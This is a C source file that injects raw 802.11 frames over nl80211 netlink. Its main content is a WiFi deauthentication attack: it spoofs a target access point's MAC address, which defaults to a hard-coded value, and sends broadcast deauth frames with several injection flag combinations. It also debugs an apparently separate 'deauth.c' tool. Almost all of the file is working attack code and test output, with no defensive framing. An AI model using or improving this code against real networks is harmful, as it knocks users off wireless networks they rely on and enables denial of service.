#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <linux/netlink.h>
#include <linux/nl80211.h>
#include <linux/genetlink.h>
#include <net/if.h>
#include <errno.h>
#include <poll.h>

#define NLA_ALIGN(len) (((len) + 3) & ~3)
#define NLA_HDRLEN ((int)NLA_ALIGN(sizeof(struct nlattr)))

static int nl80211_family = -1;

// Exact copy from test_inject.c - this WORKS
static int get_nl80211_family(int sock) {
    struct {
        struct nlmsghdr hdr;
        struct genlmsghdr genl;
        struct nlattr attr;
        char name[16];
    } req = {0};
    
    req.hdr.nlmsg_len = sizeof(req);
    req.hdr.nlmsg_type = GENL_ID_CTRL;
    req.hdr.nlmsg_flags = NLM_F_REQUEST;
    req.hdr.nlmsg_seq = 1;
    req.genl.cmd = CTRL_CMD_GETFAMILY;
    req.hdr.nlmsg_pid = getpid();
    req.attr.nla_type = CTRL_ATTR_FAMILY_NAME;
    req.attr.nla_len = sizeof(req.attr) + 8;
    strcpy(req.name, "nl80211");
    req.hdr.nlmsg_len = sizeof(req.hdr) + sizeof(req.genl) + req.attr.nla_len;
    
    send(sock, &req, req.hdr.nlmsg_len, 0);
    
    unsigned char resp[4096];
    int len = recv(sock, resp, sizeof(resp), 0);
    if (len < 0) return -1;
    
    struct nlmsghdr *hdr = (struct nlmsghdr*)resp;
    struct genlmsghdr *genl = (struct genlmsghdr*)(hdr + 1);
    struct nlattr *attr = (struct nlattr*)(genl + 1);
    int remaining = hdr->nlmsg_len - sizeof(*hdr) - sizeof(*genl);
    
    while (remaining >= (int)sizeof(struct nlattr)) {
        if (attr->nla_type == CTRL_ATTR_FAMILY_ID) {
            return *(int*)(attr + 1);
        }
        int alen = NLA_ALIGN(attr->nla_len);
        remaining -= alen;
        attr = (struct nlattr*)(((char*)attr) + alen);
    }
    return -1;
}

// Try frame injection with different attribute combos
static int try_inject(int sock, int ifidx, int freq, const unsigned char *frame, int flen,
                      int offchan, int no_cck, int dont_wait) {
    unsigned char buf[1024];
    memset(buf, 0, sizeof(buf));
    
    struct nlmsghdr *hdr = (struct nlmsghdr*)buf;
    hdr->nlmsg_type = nl80211_family;
    hdr->nlmsg_flags = NLM_F_REQUEST;
    hdr->nlmsg_seq = 100;
    hdr->nlmsg_pid = getpid();
    
    struct genlmsghdr *genl = (struct genlmsghdr*)(hdr + 1);
    genl->cmd = NL80211_CMD_FRAME;
    
    unsigned char *ptr = (unsigned char*)(genl + 1);
    
    // IFINDEX
    struct nlattr *a = (struct nlattr*)ptr;
    a->nla_type = NL80211_ATTR_IFINDEX;
    a->nla_len = sizeof(*a) + 4;
    *(int*)(a + 1) = ifidx;
    ptr += a->nla_len;
    
    // WIPHY_FREQ
    a = (struct nlattr*)ptr;
    a->nla_type = NL80211_ATTR_WIPHY_FREQ;
    a->nla_len = sizeof(*a) + 4;
    *(int*)(a + 1) = freq;
    ptr += a->nla_len;
    
    // FRAME
    a = (struct nlattr*)ptr;
    a->nla_type = NL80211_ATTR_FRAME;
    a->nla_len = sizeof(*a) + flen;
    memcpy(a + 1, frame, flen);
    ptr += a->nla_len;
    
    // Optional flags
    if (offchan) {
        a = (struct nlattr*)ptr;
        a->nla_type = NL80211_ATTR_OFFCHANNEL_TX_OK;
        a->nla_len = sizeof(*a);
        ptr += a->nla_len;
    }
    if (no_cck) {
        a = (struct nlattr*)ptr;
        a->nla_type = NL80211_ATTR_TX_NO_CCK_RATE;
        a->nla_len = sizeof(*a);
        ptr += a->nla_len;
    }
    if (dont_wait) {
        a = (struct nlattr*)ptr;
        a->nla_type = NL80211_ATTR_DONT_WAIT_FOR_ACK;
        a->nla_len = sizeof(*a);
        ptr += a->nla_len;
    }
    
    hdr->nlmsg_len = ptr - buf;
    
    int ret = send(sock, buf, hdr->nlmsg_len, 0);
    if (ret < 0) { printf("  send err: %s\n", strerror(errno)); return -1; }
    printf("  send: %d bytes\n", ret);
    
    if (dont_wait) {
        struct pollfd pfd = {.fd = sock, .events = POLLIN};
        if (poll(&pfd, 1, 200) > 0) {
            unsigned char resp[256];
            recv(sock, resp, sizeof(resp), 0);
            struct nlmsghdr *rh = (struct nlmsghdr*)resp;
            if (rh->nlmsg_type == NLMSG_ERROR) {
                int e = ((struct nlmsgerr*)(rh+1))->error;
                printf("  async err: %d (%s)\n", e, e ? strerror(-e) : "ACK");
                return e;
            }
        }
        printf("  ok (no ack, no async error)\n");
        return 0;
    }
    
    unsigned char resp[256];
    int len = recv(sock, resp, sizeof(resp), 0);
    struct nlmsghdr *rh = (struct nlmsghdr*)resp;
    if (rh->nlmsg_type == NLMSG_ERROR) {
        int e = ((struct nlmsgerr*)(rh+1))->error;
        printf("  response: err=%d (%s)\n", e, e ? strerror(-e) : "ACK/OK");
        return e;
    }
    printf("  response: type=%d (OK?)\n", rh->nlmsg_type);
    return 0;
}

int main(int argc, char **argv) {
    int freq = argc >= 2 ? atoi(argv[1]) : 2427;
    const char *target = argc >= 3 ? argv[2] : "a0:6b:4a:60:b2:74";
    
    unsigned char ap[6];
    for (int i = 0; i < 6; i++) sscanf(target + i*3, "%2hhx:", &ap[i]);
    
    int sock = socket(AF_NETLINK, SOCK_RAW, NETLINK_GENERIC);
    if (sock < 0) { perror("socket"); return 1; }
    
    struct sockaddr_nl sa = {.nl_family = AF_NETLINK};
    bind(sock, (struct sockaddr*)&sa, sizeof(sa));
    
    nl80211_family = get_nl80211_family(sock);
    printf("nl80211 family: %d\n", nl80211_family);
    
    int ifidx = if_nametoindex("wlan0");
    printf("ifidx: %d, freq: %d, target: %s\n\n", ifidx, freq, target);
    
    // Build frame - CORRECT offsets this time
    // FC(2)|Dur(2)|RA(6)|TA(6)|BSSID(6)|SEQ(2)|Reason(2)
    unsigned char correct_frame[26];
    memset(correct_frame, 0, 26);
    correct_frame[0] = 0xC0; correct_frame[1] = 0x00;   // FC: Deauth
    correct_frame[2] = 0x3A; correct_frame[3] = 0x01;   // Duration
    unsigned char bc[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
    memcpy(correct_frame+4, bc, 6);     // RA = broadcast
    memcpy(correct_frame+10, ap, 6);    // TA = AP MAC (spoofed)
    memcpy(correct_frame+16, ap, 6);    // BSSID = AP MAC
    correct_frame[24] = 7;              // Reason: Class 3 from nonassociated STA
    // SEQ at 22-23 stays 0
    
    // Also build buggy frame (original code) for comparison
    unsigned char buggy_frame[26];
    memcpy(buggy_frame, correct_frame, 26);
    buggy_frame[22] = 7;  // Reason at WRONG offset (original bug)
    buggy_frame[24] = 0;  // Actual reason stays 0
    
    // Also try minimal frame (no body)
    unsigned char minimal_frame[24];  // Just header, no body
    memset(minimal_frame, 0, 24);
    minimal_frame[0] = 0xC0; minimal_frame[1] = 0x00;
    minimal_frame[2] = 0x3A; minimal_frame[3] = 0x01;
    memcpy(minimal_frame+4, bc, 6);
    memcpy(minimal_frame+10, ap, 6);
    memcpy(minimal_frame+16, ap, 6);
    
    printf("=== Correct frame (reason at offset 24) ===\n");
    printf("Test 1: on-channel (same freq as connection?):\n");
    try_inject(sock, ifidx, freq, correct_frame, 26, 0, 0, 0);
    
    printf("\nTest 2: with OFFCHANNEL_TX_OK:\n");
    try_inject(sock, ifidx, freq, correct_frame, 26, 1, 0, 0);
    
    printf("\nTest 3: with TX_NO_CCK_RATE:\n");
    try_inject(sock, ifidx, freq, correct_frame, 26, 0, 1, 0);
    
    printf("\nTest 4: both flags:\n");
    try_inject(sock, ifidx, freq, correct_frame, 26, 1, 1, 0);
    
    printf("\n=== Buggy frame (reason at offset 22 - original code) ===\n");
    printf("Test 5: on-channel:\n");
    try_inject(sock, ifidx, freq, buggy_frame, 26, 0, 0, 0);
    
    printf("\n=== Minimal frame (24 bytes, no body) ===\n");
    printf("Test 6: on-channel:\n");
    try_inject(sock, ifidx, freq, minimal_frame, 24, 0, 0, 0);
    
    printf("\n=== Probe request (should always work) ===\n");
    unsigned char probe[] = {
        0x40, 0x00, 0x00, 0x00,
        0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
        0x00,0x00,0x00,0x00,0x00,0x00,
        0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
        0x00, 0x00,
        0x00, 0x05, 't','e','s','t','!'
    };
    printf("Test 7: offchan probe req:\n");
    try_inject(sock, ifidx, freq, probe, sizeof(probe), 1, 0, 0);
    
    // Test with DONT_WAIT_FOR_ACK (what original code uses)
    printf("\n=== DONT_WAIT_FOR_ACK (like original deauth.c) ===\n");
    printf("Test 8: correct frame with DONT_WAIT:\n");
    try_inject(sock, ifidx, freq, correct_frame, 26, 0, 0, 1);
    
    printf("\nTest 9: buggy frame with DONT_WAIT:\n");
    try_inject(sock, ifidx, freq, buggy_frame, 26, 0, 0, 1);
    
    close(sock);
    return 0;
}
